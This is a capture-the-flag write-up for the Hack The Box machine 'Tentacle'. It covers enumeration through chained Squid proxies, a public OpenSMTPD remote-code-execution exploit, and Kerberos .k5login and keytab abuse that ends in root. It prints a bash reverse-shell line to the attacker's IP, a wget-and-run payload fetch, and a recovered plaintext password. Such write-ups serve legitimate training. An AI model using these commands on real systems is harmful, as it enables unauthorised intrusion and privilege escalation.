# Tentacle

This is the write-up for the box Tentacle that got retired at the 19th June 2021.
My IP address was 10.10.14.10 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.224    tentacle.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/tentacle.nmap 10.10.10.224
```

```
PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
53/tcp   open   domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid:
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open   kerberos-sec MIT Kerberos (server time: 2022-04-09 10:15:07Z)
3128/tcp open   http-proxy   Squid http proxy 4.11
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.11
9090/tcp closed zeus-admin
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8
```

It finds a hostname _realcorp.htb_ that should be put into the _/etc/hosts_ file.

## Checking Squid Proxy (Port 3128)

When browsing to 10.10.10.224 on port 3128 it shows a message that the requested URL was not retrieved from **Squid proxy**.
There is also a potential username and hostname in there:
```
Your cache administrator is j.nakazawa@realcorp.htb.

Generated [Current Date] by srv01.realcorp.htb (squid/4.11)
```

The hostname _srv01.realcorp.htb_ should be added to the _/etc/hosts_ file.

## Checking DNS (port 53)

Using **Gobuster** to search for more subdomains:
```
gobuster dns -d realcorp.htb -r 10.10.10.224 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

Enumerating the subdomains with `nslookup`:
```
nslookup

> server 10.10.10.224

> ns.realcorp.htb
Name:   ns.realcorp.htb
Address: 10.197.243.77

> proxy.realcorp.htb
proxy.realcorp.htb      canonical name = ns.realcorp.htb.
Name:   ns.realcorp.htb
Address: 10.197.243.77

> wpad.realcorp.htb
Name:   wpad.realcorp.htb
Address: 10.197.243.31
```

### Enumerating Hosts

Trying to access _wpad.realcorp.htb_ through the proxy:
```
curl --proxy http://10.10.10.224:3128 http://10.197.243.31
```
```
Sorry, you are not currently allowed to request http://10.197.243.31/ from this cache until you have authenticated yourself.
```

To enumerate these IP addresses, the proxy has to be configured and then these can be scanned.

Configuring proxy in **Proxychains**:
```
vim /etc/proxychains.conf

# Add proxy to proxychains
http 10.10.10.224 3128
http 127.0.0.1 3128
```

Scanning the IP addresses through the proxy:
```
proxychains nmap -sT -Pn 10.197.243.77,31
```
```
Nmap scan report for 10.197.243.31
All 1000 scanned ports on 10.197.243.31 are in ignored states.

Nmap scan report for 10.197.243.77
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http
```

The IP 10.197.243.77 also has port 3128 open and may be another proxy according to the ports and the hostname _proxy.realcorp.htb_.

Configuring another proxy in **Proxychains**:
```
http 10.10.10.224 3128
http 127.0.0.1 3128
http 10.197.243.77 3128
```

Testing the connection to 10.197.243.31:
```
proxychains curl 10.197.243.31
```
```
Welcome to nginx on Red Hat Enterprise Linux!

This page is used to test the proper operation of the nginx HTTP server after it has been installed. If you can read this page, it means that the web server installed at this site is working properly.
```

On port 80 it has **nginx** for **Red Hat Enterprise Linux** installed and shows the default installation page.

## Enumerating WPAD Server

By assuming that this web server is for **Web Proxy Autodiscovery Protocol (WPAD)** then the default configuration should be called _wpad.dat_:
```
proxychains curl 10.197.243.31/wpad.dat
```

Unfortunately it does not find it, but there may be **Virtual Host Routing** enabled and another web server on the hostname.
This web server can be reached after adding _wpad.realcorp.htb_ into our _/etc/hosts_ file.

Getting the **WPAD** configuration:
```
proxychains curl wpad.realcorp.htb/wpad.dat
```
```
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "realcorp.htb"))
        return "DIRECT";
    if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
        return "DIRECT";
    if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
        return "DIRECT";

    return "PROXY proxy.realcorp.htb:3128";
}
```

## Enumerating New Scope

The IP address range 10.241.251.0 is new, so all DNS entries should be checked there:
```
dnsrecon -r 10.241.251.0/24 -n 10.10.10.224 -d DoesNotMatter
```
```
PTR srvpod01.realcorp.htb 10.241.251.113
```

Scanning ports on the IP 10.241.251.113:
```
proxychains nmap -sT -Pn 10.241.251.113
```
```
PORT   STATE SERVICE
25/tcp open  smtp
```

Enumerating port 25 with script scans:
```
proxychains nmap -sT -Pn 10.241.251.113 -p 25 -sC -sV
```
```
PORT   STATE SERVICE VERSION
25/tcp open  smtp    OpenSMTPD
| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
Service Info: Host: smtp.realcorp.htb
```

### Exploiting OpenSMTPD

This version of **OpenSMTPD** is old and has publicly known exploits:
```
searchsploit opensmtpd

OpenSMTPD 6.6.1 - Remote Code Execution    | linux/remote/47984.py
```

Changing the email address on line 60:
```python
# (...)
s.send(b'RCPT TO:<j.nakazawa@realcorp.htb>\r\n')
# (...)
```

Testing command execution with a `wget` command:
```
proxychains python3 47984.py 10.241.251.113 25 'wget 10.10.14.10'
```

After executing the script, the listener on my IP and port 80 receives a request from the box and proofs command execution, so lets use this to execute a reverse shell script.

Contents of reverse shell script _(shell.sh)_:
```
bash -i >& /dev/tcp/10.10.14.10/9001 0>&1
```

Uploading _shell.sh_ to the box:
```
proxychains python3 47984.py 10.241.251.113 25 'wget 10.10.14.10/shell.sh -O shell.sh'
```

Executing _shell.sh_:
```
proxychains python3 47984.py 10.241.251.113 25 'bash shell.sh'
```

The exploit executes _shell.sh_ and the listener on my IP and port 9001 starts a reverse shell as _root_ on _smtp.realcorp.htb_.

## Lateral Movement

This is not the host box as the hostname is _smtp.realcorp.htb_ and the IP 10.241.251.113, so we need to find other machines to move to.
To get an attack surface, it is recommended to run any **Linux Enumeration Script**:
```
wget 10.10.14.10/linpeas.sh

./linpeas.sh
```

It finds out that this is a [Podman](https://podman.io/) container.

In the users home directory is a hidden file called _/home/j.nakazawa/.msmtprc_ with a password:
```
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM>6Z~64_
```

The initial port scan had a **Kerberos** service open on port 88 and these credentials could be used to enumerate that.
With the command [kinit](https://linux.die.net/man/1/kinit) it is possible to obtain and cache Kerberos tickets.

Configuring _/etc/krb5.conf_ on our local client:
```
[libdefaults]
        default_realm = REALCORP.HTB

[realms]
            REALCORP.HTB = {
                    kdc = srv01.realcorp.htb:88
            }

[domain_realm]
            .realcorp.htb = REALCORP.HTB
            realcorp.htb = REALCORP.HTB    
```

Synchronizing time with the box:
```
sntp 10.10.10.224
```

Using `kinit` to obtain a Kerberos ticket for the user _j.nakazawa_:
```
kinit j.nakazawa
```

After sending the password, a Kerberos ticket will be granted and SSH can be used to access the box:
```
ssh j.nakazawa@10.10.10.224
```

> NOTE: In the _/etc/hosts_ file, the hostname of _srv01.realcorp.htb_ has to be specified as the first entry to make this work:
```
10.10.10.224    srv01.realcorp.htb realcorp.htb
```

## Privilege Escalation

When enumerating the box, a cronjob can be found that runs every minute as the user _admin_:
```
cat /etc/crontab

* * * * * admin /usr/local/bin/log_backup.sh
```

This script uses `rsync` to move the folder _/var/log/squid/_ into _/home/admin/_.
The group _squid_ has permissions to write into the folder and this user is a member of that group as seen with the `groups` command:
```
ls -l /var/log/ | grep squid

drwx-wx---. 2 admin  squid      41 Dec 24  2020 squid
```

This means a [.k5login](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_config/k5login.html) file can be created that allows this user to login in as _admin_:
```
echo "j.nakazawa@REALCORP.HTB" > /var/log/squid/.k5login
```

After a minute, the file _.k5login_ file will be synchronized into _/home/admin/_ and it is possible to SSH into the box as this user:
```
ssh admin@10.10.10.224
```

### Privilege Escalation to root

Checking which files the user and group _admin_ has access to:
```
find / -user admin -ls 2>/dev/null | grep -v '/home\|/sys\|/proc\|/run'

find / -group admin -ls 2>/dev/null | grep -v '/home\|/sys\|/proc\|/run'
```

The group _admin_ has permissions to read _/etc/krb5.keytab_:
```
-rw-r-----. 1 root admin 1403 Dec 19  2020 /etc/krb5.keytab
```

A [keytab](https://kb.iu.edu/d/aumh) file contains Kerberos principals and encrypted keys and can be used to authenticate to systems without using a password.
Anyone with read permissions on a **keytab** file can use all the keys in it.

Reading the keys in the keytab file:
```
klist -k /etc/krb5.keytab
```
```
host/srv01.realcorp.htb@REALCORP.HTB
kadmin/changepw@REALCORP.HTB
kadmin/admin@REALCORP.HTB
```

With these principals, it is possible to change passwords and create users and much more.

Listing all principals:
```
kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB -q "list_principals"
```

Creating a new principal with the username _root_:
```
kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB -q "add_principal -pw Pass1234 root@REALCORP.HTB"
```

Switching users to root:
```
[admin@srv01 ~]$ ksu

Kerberos password for root@REALCORP.HTB: :
```

After using the newly set password, it switches users and a shell as root is gained!
